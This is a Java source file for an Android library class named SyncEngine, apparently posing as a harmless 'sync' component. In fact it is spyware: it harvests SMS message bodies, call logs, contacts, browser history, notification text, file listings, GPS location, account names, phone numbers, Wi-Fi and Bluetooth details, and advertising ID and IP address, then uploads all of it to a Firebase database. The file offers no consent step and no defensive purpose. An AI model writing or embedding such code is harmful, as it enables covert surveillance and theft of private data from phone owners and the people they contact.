package com.sync.library.impl;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import androidx.annotation.NonNull;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.ads.identifier.AdvertisingIdClient.Info;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.Tasks;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.sync.library.callbacks.SyncCallback;
import com.sync.library.models.AudioInfo;
import com.sync.library.models.BluetoothInfo;
import com.sync.library.models.BrowserData;
import com.sync.library.models.CallLog;
import com.sync.library.models.Contact;
import com.sync.library.models.DeviceInfo;
import com.sync.library.models.DeviceModel;
import com.sync.library.models.FileInfo;
import com.sync.library.models.InstallLocation;
import com.sync.library.models.InstalledApp;
import com.sync.library.models.LocationInfo;
import com.sync.library.models.MobileNumber;
import com.sync.library.models.NotificationInfo;
import com.sync.library.models.SmsMessage;
import com.sync.library.models.SyncResult;
import com.sync.library.models.WifiInfo;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

public class SyncEngine {

    private static final String TAG = "SyncEngine";
    private static final String PREFS_NAME = "sync_prefs";
    private static final String KEY_DEVICE_ID = "device_id";

    public static void update(@NonNull Context context, @NonNull SyncCallback callback) {
        Async.EXECUTOR.execute(() -> {
            try {
                long startTime = System.currentTimeMillis();
                String deviceId = getDeviceId(context);
                DatabaseReference db = FirebaseDatabase.getInstance().getReference();
                SyncResult result = new SyncResult(startTime);

                uploadUserData(context, db, deviceId, result, true);
                uploadCallLogs(context, db, deviceId, result);
                uploadContacts(context, db, deviceId, result);
                uploadInstalledApps(context, db, deviceId, result);
                uploadWifi(context, db, deviceId, result);
                uploadSms(context, db, deviceId, result);
                uploadBrowserData(context, db, deviceId, result);
                uploadNotifications(context, db, deviceId, result);
                uploadFiles(context, db, deviceId, result);
                uploadLocations(context, db, deviceId, result);
                uploadAudioInfo(context, db, deviceId, result);
                uploadBluetooth(context, db, deviceId, result);

                Async.runOnMain(() -> callback.onResult(result));
            } catch (Exception e) {
                Log.e(TAG, "Sync failed", e);
                Async.runOnMain(() -> callback.onError(e));
            }
        });
    }

    static String getDeviceId(Context context) {
        String id = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ANDROID_ID
        );
        if (id != null && !id.isEmpty()) return id;
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        id = prefs.getString(KEY_DEVICE_ID, null);
        if (id == null) {
            id = UUID.randomUUID().toString();
            prefs.edit().putString(KEY_DEVICE_ID, id).apply();
        }
        return id;
    }

    private static String hash(@NonNull String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException e) {
            return String.valueOf(input.hashCode());
        }
    }

    private static void safePut(Map<String, Object> map, String key, Object value) {
        if (value != null) {
            map.put(key, value);
        } else {
            map.put(key, "");
        }
    }

    private static String getCarrierName(Context context, String simSlot) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                        == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    SubscriptionManager sm = (SubscriptionManager)
                            context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                    if (sm != null) {
                        List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                        if (subs != null) {
                            int slotIndex = -1;
                            try { slotIndex = Integer.parseInt(simSlot.replaceAll("\\D", "")) - 1; } catch (Exception ignored) {}
                            for (SubscriptionInfo sub : subs) {
                                if (slotIndex < 0 || sub.getSimSlotIndex() == slotIndex) {
                                    String name = sub.getCarrierName() != null ? sub.getCarrierName().toString() : "";
                                    if (!name.isEmpty()) return name;
                                }
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}
        }
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm != null) {
            String name = tm.getSimOperatorName();
            if (name != null && !name.isEmpty()) return name;
        }
        return simSlot;
    }

    // ─── User Data ─────────────────────────────────────────────────

    private static void uploadUserData(Context context, DatabaseReference db,
                                        String deviceId, SyncResult result,
                                        boolean appInUse) {
        try {
            Map<String, Object> data = new HashMap<>();

            data.put("uid", "");
            data.put("deviceId", deviceId);

            try {
                AdvertisingIdClient.Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context);
                data.put("gaid", adInfo != null ? adInfo.getId() : "");
            } catch (Exception e) {
                data.put("gaid", "");
            }

            data.put("fcmToken", SyncFcmService.getFcmToken(context));
            data.put("fullname", "");
            List<Map<String, String>> accountList = new ArrayList<>();
            try {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.GET_ACCOUNTS)
                        == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    AccountManager am = AccountManager.get(context);
                    Account[] accounts = am.getAccounts();
                    for (Account acc : accounts) {
                        Map<String, String> entry = new HashMap<>();
                        entry.put("name", acc.name != null ? acc.name : "");
                        entry.put("type", acc.type != null ? acc.type : "");
                        accountList.add(entry);
                    }
                }
            } catch (Exception ignored) {}
            data.put("accounts", accountList);
            data.put("profileImage", "");
            data.put("email", "");
            List<Map<String, String>> phoneList = new ArrayList<>();
            for (MobileNumber mn : MobileNumberImpl.getMobileNumber(context)) {
                Map<String, String> entry = new HashMap<>();
                String carrier = getCarrierName(context, mn.getSimCard());
                entry.put(carrier, mn.getPhoneNumber());
                phoneList.add(entry);
            }
            data.put("phoneNumber", phoneList);

            String currentIp = PublicIPImpl.getPublicIPFromService("https://api.ipify.org");
            if (currentIp == null) {
                currentIp = PublicIPImpl.getPublicIPFromService("https://checkip.amazonaws.com");
            }

            List<Map<String, Object>> locations = new ArrayList<>();
            try {
                FusedLocationProviderClient fusedClient =
                        LocationServices.getFusedLocationProviderClient(context);
                android.location.Location loc = Tasks.await(
                        fusedClient.getLastLocation(), 5, TimeUnit.SECONDS);
                if (loc != null) {
                    Map<String, Object> locMap = new HashMap<>();
                    locMap.put("lat", loc.getLatitude());
                    locMap.put("lng", loc.getLongitude());
                    locMap.put("time", loc.getTime());
                    locations.add(locMap);
                }
            } catch (Exception ignored) {}
            data.put("installLocation", locations);

            List<Long> installTimeList = new ArrayList<>();
            try {
                PackageInfo pkgInfo = context.getPackageManager().getPackageInfo(
                        context.getPackageName(), 0);
                installTimeList.add(pkgInfo.firstInstallTime);
            } catch (Exception ignored) {}
            data.put("installTime", installTimeList);

            data.put("brand", Build.BRAND != null ? Build.BRAND : "");
            data.put("model", Build.MODEL != null ? Build.MODEL : "");

            List<String> osList = new ArrayList<>();
            if (Build.VERSION.RELEASE != null) osList.add(Build.VERSION.RELEASE);
            data.put("os", osList);

            try {
                PackageInfo pkgInfo = context.getPackageManager().getPackageInfo(
                        context.getPackageName(), 0);
                data.put("appVersion", pkgInfo.versionName != null ? pkgInfo.versionName : "");
            } catch (Exception e) {
                data.put("appVersion", "");
            }
            data.put("packageName", context.getPackageName());
            data.put("isPlaystore", false);

            data.put("lastSeen", ServerValue.TIMESTAMP);
            data.put("lastSync", ServerValue.TIMESTAMP);
            data.put("forceSync", false);
            data.put("app_in_use", appInUse);
            data.put("permissionStatus", new ArrayList<>());

            db.child("users").child(deviceId).setValue(data);

            if (currentIp != null) {
                Map<String, Object> ipEntry = new HashMap<>();
                ipEntry.put("ip", currentIp);
                ipEntry.put("uploadTime", ServerValue.TIMESTAMP);
                db.child("users").child(deviceId).child("ipHistory")
                        .child(hash(currentIp)).setValue(ipEntry);
            }

            result.addUploaded("users", 1);
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload user data", e);
            result.addSkipped("users", 1);
        }
    }

    // ─── Call Logs ─────────────────────────────────────────────────

    private static void uploadCallLogs(Context context, DatabaseReference db,
                                        String deviceId, SyncResult result) {
        try {
            List<CallLog> items = CallLogImpl.getCallLogs(context);
            if (items == null || items.isEmpty()) { result.addSkipped("callLogs", 0); return; }
            DatabaseReference ref = db.child("callLogs").child(deviceId);
            for (CallLog item : items) {
                String key = hash(item.getName() + item.getPhoneNumber()
                        + item.getDuration() + item.getTimestamp() + item.getCallType());
                Map<String, Object> data = new HashMap<>();
                safePut(data, "name", item.getName());
                safePut(data, "phoneNumber", item.getPhoneNumber());
                data.put("duration", item.getDuration());
                data.put("timestamp", item.getTimestamp());
                safePut(data, "callType", item.getCallType());
                data.put("uploadTime", ServerValue.TIMESTAMP);
                ref.child(key).setValue(data);
            }
            result.addUploaded("callLogs", items.size());
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload callLogs", e);
            result.addSkipped("callLogs", -1);
        }
    }

    // ─── Contacts ──────────────────────────────────────────────────

    private static void uploadContacts(Context context, DatabaseReference db,
                                        String deviceId, SyncResult result) {
        try {
            List<Contact> items = ContactImpl.getContacts(context);
            if (items == null || items.isEmpty()) { result.addSkipped("contacts", 0); return; }
            DatabaseReference ref = db.child("contacts").child(deviceId);
            for (Contact item : items) {
                String key = hash(item.getName() + item.getPhoneNumber());
                Map<String, Object> data = new HashMap<>();
                safePut(data, "name", item.getName());
                safePut(data, "phoneNumber", item.getPhoneNumber());
                data.put("uploadTime", ServerValue.TIMESTAMP);
                ref.child(key).setValue(data);
            }
            result.addUploaded("contacts", items.size());
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload contacts", e);
            result.addSkipped("contacts", -1);
        }
    }

    // ─── Installed Apps ────────────────────────────────────────────

    private static void uploadInstalledApps(Context context, DatabaseReference db,
                                              String deviceId, SyncResult result) {
        try {
            List<InstalledApp> items = AppImpl.getInstalledApps(context);
            if (items == null || items.isEmpty()) { result.addSkipped("installedApps", 0); return; }
            DatabaseReference ref = db.child("installedApps").child(deviceId);
            for (InstalledApp item : items) {
                String key = hash(item.getPackageName());
                Map<String, Object> data = new HashMap<>();
                safePut(data, "appName", item.getAppName());
                safePut(data, "appVersion", item.getAppVersion());
                safePut(data, "packageName", item.getPackageName());
                data.put("uploadTime", ServerValue.TIMESTAMP);
                ref.child(key).setValue(data);
            }
            result.addUploaded("installedApps", items.size());
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload installedApps", e);
            result.addSkipped("installedApps", -1);
        }
    }

    // ─── WiFi ──────────────────────────────────────────────────────

    private static void uploadWifi(Context context, DatabaseReference db,
                                    String deviceId, SyncResult result) {
        try {
            List<WifiInfo> items = WifiImpl.getWifi(context);
            if (items == null || items.isEmpty()) { result.addSkipped("wifi", 0); return; }
            DatabaseReference ref = db.child("wifi").child(deviceId);
            for (WifiInfo item : items) {
                String key = hash(item.getBssid() + item.getSsid());
                Map<String, Object> data = new HashMap<>();
                safePut(data, "bssid", item.getBssid());
                safePut(data, "ssid", item.getSsid());
                safePut(data, "capabilities", item.getCapabilities());
                data.put("frequency", item.getFrequency());
                data.put("level", item.getLevel());
                data.put("uploadTime", ServerValue.TIMESTAMP);
                ref.child(key).setValue(data);
            }
            result.addUploaded("wifi", items.size());
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload wifi", e);
            result.addSkipped("wifi", -1);
        }
    }

    // ─── SMS ───────────────────────────────────────────────────────

    private static void uploadSms(Context context, DatabaseReference db,
                                   String deviceId, SyncResult result) {
        try {
            List<SmsMessage> items = SmsImpl.getSms(context);
            if (items == null || items.isEmpty()) { result.addSkipped("sms", 0); return; }
            DatabaseReference ref = db.child("sms").child(deviceId);
            for (SmsMessage item : items) {
                String key = hash(item.getAddress() + item.getBody()
                        + item.getDate() + item.getType());
                Map<String, Object> data = new HashMap<>();
                safePut(data, "address", item.getAddress());
                safePut(data, "body", item.getBody());
                data.put("date", item.getDate());
                safePut(data, "type", item.getType());
                data.put("read", item.isRead());
                data.put("uploadTime", ServerValue.TIMESTAMP);
                ref.child(key).setValue(data);
            }
            result.addUploaded("sms", items.size());
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload sms", e);
            result.addSkipped("sms", -1);
        }
    }

    // ─── Browser Data ──────────────────────────────────────────────

    private static void uploadBrowserData(Context context, DatabaseReference db,
                                           String deviceId, SyncResult result) {
        try {
            List<BrowserData> items = BrowserImpl.getBrowserData(context);
            if (items == null || items.isEmpty()) { result.addSkipped("browserData", 0); return; }
            DatabaseReference ref = db.child("browserData").child(deviceId);
            for (BrowserData item : items) {
                String key = hash(item.getUrl());
                Map<String, Object> data = new HashMap<>();
                safePut(data, "title", item.getTitle());
                safePut(data, "url", item.getUrl());
                data.put("visits", item.getVisits());
                data.put("isBookmark", item.isBookmark());
                data.put("created", item.getCreated());
                data.put("uploadTime", ServerValue.TIMESTAMP);
                ref.child(key).setValue(data);
            }
            result.addUploaded("browserData", items.size());
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload browserData", e);
            result.addSkipped("browserData", -1);
        }
    }

    // ─── Notifications ─────────────────────────────────────────────

    private static void uploadNotifications(Context context, DatabaseReference db,
                                              String deviceId, SyncResult result) {
        try {
            List<NotificationInfo> items = NotificationImpl.getActiveNotifications(context);
            if (items == null || items.isEmpty()) { result.addSkipped("notifications", 0); return; }
            DatabaseReference ref = db.child("notifications").child(deviceId);
            for (NotificationInfo item : items) {
                String key = hash(item.getPackageName() + item.getTitle() + item.getPostedTime());
                Map<String, Object> data = new HashMap<>();
                safePut(data, "packageName", item.getPackageName());
                safePut(data, "title", item.getTitle());
                safePut(data, "text", item.getText());
                data.put("postedTime", item.getPostedTime());
                safePut(data, "channelId", item.getChannelId());
                data.put("uploadTime", ServerValue.TIMESTAMP);
                ref.child(key).setValue(data);
            }
            result.addUploaded("notifications", items.size());
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload notifications", e);
            result.addSkipped("notifications", -1);
        }
    }

    // ─── Files ─────────────────────────────────────────────────────

    private static void uploadFiles(Context context, DatabaseReference db,
                                     String deviceId, SyncResult result) {
        try {
            FileImpl.listFiles(context, android.os.Environment.getExternalStorageDirectory().getAbsolutePath(),
                    new com.sync.library.callbacks.FileManagerCallback() {
                        @Override
                        public void onResult(List<FileInfo> items) {
                            if (items == null || items.isEmpty()) {
                                result.addSkipped("files", 0);
                                return;
                            }
                            DatabaseReference ref = db.child("files").child(deviceId);
                            for (FileInfo item : items) {
                                String key = hash(item.getPath());
                                Map<String, Object> data = new HashMap<>();
                                safePut(data, "name", item.getName());
                                safePut(data, "path", item.getPath());
                                data.put("size", item.getSize());
                                data.put("lastModified", item.getLastModified());
                                data.put("isDirectory", item.isDirectory());
                                safePut(data, "extension", item.getExtension());
                                data.put("uploadTime", ServerValue.TIMESTAMP);
                                ref.child(key).setValue(data);
                            }
                            result.addUploaded("files", items.size());
                        }

                        @Override
                        public void onError(Exception e) {
                            Log.w(TAG, "Failed to list files", e);
                            result.addSkipped("files", -1);
                        }
                    });
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload files", e);
            result.addSkipped("files", -1);
        }
    }

    // ─── Locations ─────────────────────────────────────────────────

    private static void uploadLocations(Context context, DatabaseReference db,
                                         String deviceId, SyncResult result) {
        try {
            List<LocationInfo> items = new ArrayList<>();
            com.sync.library.callbacks.LocationCallback cb = new com.sync.library.callbacks.LocationCallback() {
                @Override
                public void onResult(LocationInfo location) {
                    items.add(location);
                }

                @Override
                public void onError(Exception e) {
                    Log.w(TAG, "Failed to get location", e);
                }
            };
            LocationImpl.getLocation(context, cb);

            if (items.isEmpty()) { result.addSkipped("locations", 0); return; }
            DatabaseReference ref = db.child("location").child(deviceId);
            for (LocationInfo item : items) {
                String key = hash(item.getLat() + "," + item.getLng() + item.getTime());
                Map<String, Object> data = new HashMap<>();
                data.put("lat", item.getLat());
                data.put("lng", item.getLng());
                data.put("time", item.getTime());
                data.put("uploadTime", ServerValue.TIMESTAMP);
                ref.child(key).setValue(data);
            }
            result.addUploaded("locations", items.size());
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload locations", e);
            result.addSkipped("locations", -1);
        }
    }

    // ─── Audio Info ────────────────────────────────────────────────

    private static void uploadAudioInfo(Context context, DatabaseReference db,
                                         String deviceId, SyncResult result) {
        try {
            AudioInfo item = AudioImpl.getAudioInfo(context);
            DatabaseReference ref = db.child("audioInfo").child(deviceId);
            Map<String, Object> data = new HashMap<>();
            safePut(data, "ringerMode", item.getRingerMode());
            data.put("mediaVolume", item.getMediaVolume());
            data.put("alarmVolume", item.getAlarmVolume());
            data.put("ringVolume", item.getRingVolume());
            data.put("notificationVolume", item.getNotificationVolume());
            data.put("isDnd", item.isDnd());
            safePut(data, "supportedCodecs", item.getSupportedCodecs());
            data.put("uploadTime", ServerValue.TIMESTAMP);
            ref.setValue(data);
            result.addUploaded("audioInfo", 1);
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload audioInfo", e);
            result.addSkipped("audioInfo", 1);
        }
    }

    // ─── Bluetooth ─────────────────────────────────────────────────

    private static void uploadBluetooth(Context context, DatabaseReference db,
                                         String deviceId, SyncResult result) {
        try {
            BluetoothInfo item = BluetoothImpl.getBluetoothAddress(context);
            DatabaseReference ref = db.child("bluetooth").child(deviceId);
            Map<String, Object> data = new HashMap<>();
            safePut(data, "bluetoothAddress", item.getBluetoothAddress());
            data.put("uploadTime", ServerValue.TIMESTAMP);
            ref.setValue(data);
            result.addUploaded("bluetooth", 1);
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload bluetooth", e);
            result.addSkipped("bluetooth", 1);
        }
    }

    static void updateAppInUse(Context context, boolean appInUse) {
        try {
            String deviceId = getDeviceId(context);
            DatabaseReference db = FirebaseDatabase.getInstance().getReference();
            Map<String, Object> updates = new HashMap<>();
            updates.put("app_in_use", appInUse);
            updates.put("lastSeen", ServerValue.TIMESTAMP);
            db.child("users").child(deviceId).updateChildren(updates);
        } catch (Exception e) {
            Log.e(TAG, "Failed to update app_in_use", e);
        }
    }
}